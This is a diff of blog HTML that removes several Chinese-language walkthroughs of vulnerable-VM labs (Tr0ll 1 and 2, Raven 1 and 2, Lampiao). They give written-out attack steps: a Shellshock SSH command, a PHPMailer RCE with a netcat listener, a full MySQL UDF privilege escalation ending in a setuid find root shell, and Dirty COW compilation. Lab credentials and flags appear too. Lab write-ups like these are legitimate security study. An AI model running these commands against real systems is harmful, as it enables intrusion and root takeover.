-<p><img src="/2020/03/03/Tr0ll-2/image-20200303214727575.png" alt="image-20200303214727575"></p>
-<p>ftp进去 用户密码都是作者名</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303220321566.png" alt="image-20200303220321566"></p>
-<p>里面发现个l mao.zip下载下来解压发现有密码 先留着  robots.txt发现很多目录 可以保存下来 用dirb做字典扫一下 </p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303220724680.png" alt="image-20200303220724680"></p>
-<p>结果 </p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303220804705.png" alt="image-20200303220804705"></p>
-<p>这个路径我们可以深入搞一下 源码里还藏了个图片 </p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303220902152.png" alt="image-20200303220902152"></p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303220954440.png" alt="image-20200303220954440"></p>
-<p>拖片wget下来 tail标准输出下 好像在打ctf….</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303221204273.png" alt="image-20200303221204273"></p>
-<p>照着他的话做喽 访问下路径 发现密码本 都是base64 解一下拿去爆之前那个zip</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303221324637.png" alt="image-20200303221324637"></p>
-<p>使用fcrackzip工具（专门用来破解zip密码）<br>PASSWORD FOUND!!!: pw == ItCantReallyBeThisEasyRightLOL</p>
-<p>解出来的 cat一下发现是ssh密钥 试了一下</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303221853545.png" alt="image-20200303221853545"></p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303222203450.png" alt="image-20200303222203450"></p>
-<p>这里的意思是，链接失效了，可以登录需要外壳拿权限</p>
-<p>方法在这里 <a href="https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh</a></p>
-<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p>命令 ：ssh <a href="mailto:noob@192.168.0.104">noob@192.168.0.104</a> -i noob -t “() { :;}; /bin/bash”</p>
-<p>多试试 看我多惨…</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303223053104.png" alt="image-20200303223053104"></p>
-<p>我们使用exploit进行命令注入攻击拿到反弹shell在本地上</p>
-<p>如图搞就行</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303223538369.png" alt="image-20200303223538369"></p>
-<p>使用python -c ‘import pty; pty.spawn(“/bin/bash”)’进入noob用户</p>
-<p>然后命令：find / -perm -4000 2&gt;/dev/null<br>使用find查看底层目录</p>
-<p><img src="/2020/03/03/Tr0ll-2/image-20200303223952517.png" alt="image-20200303223952517"></p>
-<p>缓冲区溢出….</p>
-<p>命令：gdb -q r00t（加载执行r00t程序发生溢出时来跟踪EIP的值）<br>命令：set disassembly-flavor intel（转换为intel格式的汇编）<br>命令：disas main（显示main函数对应的汇编代码）</p>
-<p>三个门 不同的三个功能 我们是需要最大的文件也就是返回用户输出功能的</p>
-<p>明天再搞 </p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -908,56 +467,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>这次又是双生 第一篇</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302200318055.png" alt="image-20200302200318055"></p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302200434911.png" alt="image-20200302200434911"></p>
-<p>80端口</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302200447964.png" alt="image-20200302200447964"></p>
-<p>dirb扫一下</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302200828953.png" alt="image-20200302200828953"></p>
-<p>查看下robots</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302200912404.png" alt="image-20200302200912404"></p>
-<p>访问下 哎我去 挑衅？看我一会儿拿下给你加密一下  80不行转战FTP</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302201028285.png" alt="image-20200302201028285"></p>
-<p>ftp拿下pcap文件 分析下 有个账号 另一个包还有个不知道是啥的 也许是目录</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302203253733.png" alt="image-20200302203253733"></p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302203348293.png" alt="image-20200302203348293"></p>
-<p>果然是个目录</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302203453329.png" alt="image-20200302203453329"></p>
-<p>下载 搜下字符</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302203744541.png" alt="image-20200302203744541"></p>
-<p>哎 心累 再去访问下 终于知道直男男朋友送套娃 女生心里是怎么想的了</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302203917895.png" alt="image-20200302203917895"></p>
-<p>第一个是账号</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302204142840.png" alt="image-20200302204142840"></p>
-<p>第二个是密码</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302204207188.png" alt="image-20200302204207188"></p>
-<p>密码固定 用户就hydra用来做字典跑一下 结果用户是overflow 还溢出…</p>
-<p>不行呢！头脑风暴一下 这个作者我是真服 good job是对我说的 那就是目录名字就是密码呗</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302204733348.png" alt="image-20200302204733348"></p>
-<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p><img src="/2020/03/02/Tr0ll-1/image-20200302204912179.png" alt="image-20200302204912179"></p>
-<p>….我还能说什么</p>
-<h1 id="0x02-内核提权"><a href="#0x02-内核提权" class="headerlink" title="0x02 内核提权"></a><strong>0x02 内核提权</strong></h1><p>根据内核 kali搜下exp</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302205724077.png" alt="image-20200302205724077"></p>
-<p>cp过来 python3开个http</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302210024549.png" alt="image-20200302210024549"></p>
-<p>wget落地 要去tmp /下不让写入</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302210247114.png" alt="image-20200302210247114"></p>
-<p>编译运行 提权成功</p>
-<p><img src="/2020/03/02/Tr0ll-1/image-20200302210414249.png" alt="image-20200302210414249"></p>
-<p>还有很多方法如计划任务反弹 大家可以自行试下 </p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -1018,53 +527,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-书接上回"><a href="#0x00-书接上回" class="headerlink" title="0x00 书接上回"></a><strong>0x00 书接上回</strong></h1><p>Raven第二部其实就是Raven1的加固版 要利用phpmalier远程代码执行漏洞（CVE-2016-10033）</p>
-<p>前期的那些发现步骤我们就不做赘述了 没看过的师傅们可以去看下我的Raven1那章</p>
-<h1 id="0x01-phpmailer远程代码执行"><a href="#0x01-phpmailer远程代码执行" class="headerlink" title="0x01 phpmailer远程代码执行"></a><strong>0x01 phpmailer远程代码执行</strong></h1><p>在 <a href="http://192.168.8.126/vendor/PATH" target="_blank" rel="noopener">http://192.168.8.126/vendor/PATH</a> 发现第一个flag和网站根路径：/var/www/html/</p>
-<p><img src="/2020/03/02/Raven2/image-20200302142612649.png" alt="image-20200302142612649"></p>
-<p>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</p>
-<p>在 <a href="http://192.168.0.102/vendor/VERSION" target="_blank" rel="noopener">http://192.168.0.102/vendor/VERSION</a> 发现版本号</p>
-<p>在kali中 searchsploit phpmailer 这个py在我们的射程内</p>
-<p><img src="/2020/03/02/Raven2/image-20200302143039705.png" alt="image-20200302143039705"></p>
-<p>cp过来 改下代码  大家都懂 </p>
-<p><img src="/2020/03/02/Raven2/image-20200302143133899.png" alt="image-20200302143133899"></p>
-<p><img src="/2020/03/02/Raven2/image-20200302143547074.png" alt="image-20200302143547074"></p>
-<p>访问这个路径自动生成backdoor里你填的文件 访问就会执行payload nc提前接着</p>
-<p><img src="/2020/03/02/Raven2/image-20200302144032371.png" alt="image-20200302144032371"></p>
-<p>python切换到交互式shell</p>
-<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
-<p>find找flag 访问 我们目标拿root 不赘述了</p>
-<p><img src="/2020/03/02/Raven2/image-20200302144523146.png" alt="image-20200302144523146"></p>
-<p><img src="/2020/03/02/Raven2/image-20200302144539076.png" alt="image-20200302144539076"></p>
-<h1 id="0x02-登数据库"><a href="#0x02-登数据库" class="headerlink" title="0x02 登数据库"></a><strong>0x02 登数据库</strong></h1><p>还是老规矩 wordpress配置文件拿帐号 </p>
-<p><img src="/2020/03/02/Raven2/image-20200302144755036.png" alt="image-20200302144755036"></p>
-<p>登上去后 Raven1里是表里拿帐号解密 ssh 这里不行 就不展示了 要走mysql udf提权</p>
-<h1 id="0x03-mysql-udf提权"><a href="#0x03-mysql-udf提权" class="headerlink" title="0x03 mysql udf提权"></a><strong>0x03 mysql udf提权</strong></h1><p>Exploit-db 🔗 <a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1518</a></p>
-<p>kali搜一下也行 </p>
-<p><img src="/2020/03/02/Raven2/image-20200302145836960.png" alt="image-20200302145836960"></p>
-<p>本地编译</p>
-<p>gcc -g -c 1518.c</p>
-<p>gcc -g -shared -o  1518.so 1518.o -lc</p>
-<p><img src="/2020/03/02/Raven2/image-20200302150816621.png" alt="image-20200302150816621"></p>
-<p>开个http wget落地</p>
-<p>开始提权</p>
-<p>照着操作即可</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">4</span> <span class="function">rows <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; use wordpress</span>;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off <span class="keyword">this</span> feature to <span class="keyword">get</span> a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; <span class="function">create table <span class="title">foo</span>(<span class="params">line blob</span>)</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; insert <span class="keyword">into</span> foo <span class="title">values</span>(<span class="params">load_file(<span class="string">'/var/www/html/1518.so'</span></span>))</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.12</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> foo <span class="keyword">into</span> dumpfile '/usr/lib/mysql/plugin/1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="function">row <span class="title">affected</span> (<span class="params"><span class="number">0.03</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; create function do_system returns integer soname '1518.so'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="function">rows <span class="title">affected</span> (<span class="params"><span class="number">0.11</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> mysql.func</span>;</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| name      | ret | dl      | type     |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line">| do_system |   <span class="number">2</span> | <span class="number">1518.</span>so | function |</span><br><span class="line">+-----------+-----+---------+----------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.00</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; <span class="keyword">select</span> <span class="title">do_system</span>(<span class="params"><span class="string">'chmod u+s /usr/bin/find'</span></span>)</span>;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(<span class="string">'chmod u+s /usr/bin/find'</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    <span class="number">0</span> |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.01</span> sec</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">mysql&gt; quit</span></span><br><span class="line"><span class="function">Bye</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">touch foo</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">find foo -exec 'whoami' \</span>;</span><br><span class="line"></span><br><span class="line">find foo -exec <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/02/Raven2/image-20200302151918277.png" alt="image-20200302151918277"></p>
-<p>恭喜闯关成功！</p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -1125,44 +587,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0X00-信息收集"><a href="#0X00-信息收集" class="headerlink" title="0X00 信息收集"></a><strong>0X00 信息收集</strong></h1><p><img src="/2020/03/01/Raven1/image-20200301234057318.png" alt="image-20200301234057318"></p>
-<p><img src="/2020/03/01/Raven1/image-20200301234200183.png" alt="image-20200301234200183"></p>
-<p>80撬它 警察姐姐 我是正规的安全工程师哦 </p>
-<p><img src="/2020/03/01/Raven1/image-20200301234302966.png" alt="image-20200301234302966"></p>
-<p>扫一下目录</p>
-<p><img src="/2020/03/01/Raven1/image-20200301234349002.png" alt="image-20200301234349002"></p>
-<p>ok  <a href="http://172.16.24.37/service.html" target="_blank" rel="noopener">http://172.16.24.37/service.html</a> 拿到了第一个flag，在源代码262行处</p>
-<p><img src="/2020/03/01/Raven1/image-20200301234534546.png" alt="image-20200301234534546"></p>
-<h1 id="0x01-获取帐号"><a href="#0x01-获取帐号" class="headerlink" title="0x01 获取帐号"></a><strong>0x01 获取帐号</strong></h1><p>扫目录有个地方是wordpress</p>
-<p>那么wpscan开怼 账号拿到</p>
-<p><img src="/2020/03/01/Raven1/image-20200302005818194.png" alt="image-20200302005818194"></p>
-<p>/var/www/下找到 flag2</p>
-<p><img src="/2020/03/01/Raven1/image-20200302010009561.png" alt="image-20200302010009561"></p>
-<p>拿数据库账号</p>
-<p><img src="/2020/03/01/Raven1/image-20200302010223595.png" alt="image-20200302010223595"></p>
-<p><img src="/2020/03/01/Raven1/image-20200302010258471.png" alt="image-20200302010258471"></p>
-<p>mysql账户密码为：“root”、“R<a href="https://github.com/v3nSecurity" target="_blank" rel="noopener">@v3nSecurity</a>”</p>
-<p>登陆 select咔咔一波</p>
-<p><img src="/2020/03/01/Raven1/image-20200302010848864.png" alt="image-20200302010848864"></p>
-<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a>  干就完了 奥利给</p>
-<p><img src="/2020/03/01/Raven1/image-20200302011129407.png" alt="image-20200302011129407"></p>
-<p>得到<code>steven</code>密码为<code>pink84</code></p>
-<h1 id="0x02-python提权"><a href="#0x02-python提权" class="headerlink" title="0x02 python提权"></a><strong>0x02 python提权</strong></h1><p>su过去 python切到/bin/bash 大哥搞定！</p>
-<p><img src="/2020/03/01/Raven1/image-20200302011456706.png" alt="image-20200302011456706"></p>
-<p>还有其他思路其实</p>
-<p>存在<code>CVE-2016-6662 mysql</code>远程代码执行/权限提升漏洞<br>还可以<code>UDF</code>提权</p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
@@ -1223,59 +647,6 @@ if(isset($_POST['submit'])) {
     
 
     
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p>老生常谈</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301164232495.png" alt="image-20200301164232495"></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301164422065.png" alt="image-20200301164422065"></p>
-<p>1898看一下喽 用的google插件 看到了cms是Drupal7,具体是什么小版本呢？接下来看</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301164729523.png" alt="image-20200301164729523"></p>
-<p>常规思路 要扫描的 这里不展示了 看下防爬 有个日志文件 最后一次更新小版本54</p>
-<p>这个是RCE的 CVE编号CVE-2018-7600 poc构造附上 <a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301165005159.png" alt="image-20200301165005159"></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301165045429.png" alt="image-20200301165045429"></p>
-<p>msf启动 search到了drupal 就你了四号种子选手</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301165434860.png" alt="image-20200301165434860"></p>
-<h1 id="0x01-获取会话"><a href="#0x01-获取会话" class="headerlink" title="0x01 获取会话"></a><strong>0x01 获取会话</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301165628660.png" alt="image-20200301165628660"></p>
-<p>由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301165741613.png" alt="image-20200301165741613"></p>
-<h1 id="0x02-寻找突破"><a href="#0x02-寻找突破" class="headerlink" title="0x02 寻找突破"></a><strong>0x02 寻找突破</strong></h1><p>html路径下的四个文件 传回来查看</p>
-<ol>
-<li>qrc.png：一个二维码，扫出来的结果是 Try harger! muahuahuahua，被作者鼓励了。。</li>
-<li>audio.m4a：提示为user tiago，说明要先找到用户tiago的密码</li>
-<li>uizGonzaga-LampiaoFalou.mp3：一首音乐，丢入隐写工具没发现什么异常</li>
-<li>lampiao.jpg：一张牛仔的图片，丢入binwlak中未发现有什么隐写</li>
-</ol>
-<p>var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301170402837.png" alt="image-20200301170402837"></p>
-<h1 id="0x03-获取普通权限"><a href="#0x03-获取普通权限" class="headerlink" title="0x03 获取普通权限"></a><strong>0x03 获取普通权限</strong></h1><p>其实root加数据库密码也上去了 </p>
-<p><img src="/2020/03/01/Lampiao/image-20200301170722270.png" alt="image-20200301170722270"></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301170854563.png" alt="image-20200301170854563"></p>
-<p>翻来覆去怎么也没折腾到主机root权限 看下内核吧 说不定能脏牛呢</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301171113982.png" alt="image-20200301171113982"></p>
-<p>说啥来啥 哈哈 </p>
-<h1 id="0x03-dirty-cow提权"><a href="#0x03-dirty-cow提权" class="headerlink" title="0x03 dirty cow提权"></a><strong>0x03 dirty cow提权</strong></h1><p>exploit-db给了exp 🔗 <a href="https://www.exploit-db.com/exploits/40847" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40847</a></p>
-<p>我用的msf里的</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301173935106.png" alt="image-20200301173935106"></p>
-<p><img src="/2020/03/01/Lampiao/image-20200301173909301.png" alt="image-20200301173909301"></p>
-<p>python开个http 靶机wget下载</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301174353272.png" alt="image-20200301174353272"></p>
-<p>编译一下 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</p>
-<p>./40847</p>
-<p>执行成功，root用户需要用dirtyCowFun密码登录服务器。</p>
-<p>ssh重新连接，用户为root，密码为dirtyCowFun</p>
-<p><img src="/2020/03/01/Lampiao/image-20200301174535764.png" alt="image-20200301174535764"></p>
-<h1 id="0x04-拿到flag"><a href="#0x04-拿到flag" class="headerlink" title="0x04 拿到flag"></a><strong>0x04 拿到flag</strong></h1><p><img src="/2020/03/01/Lampiao/image-20200301174904144.png" alt="image-20200301174904144"></p>
-
-      
-      <!-- reward -->
-      
-    </div>
     
     
       <!-- copyright -->
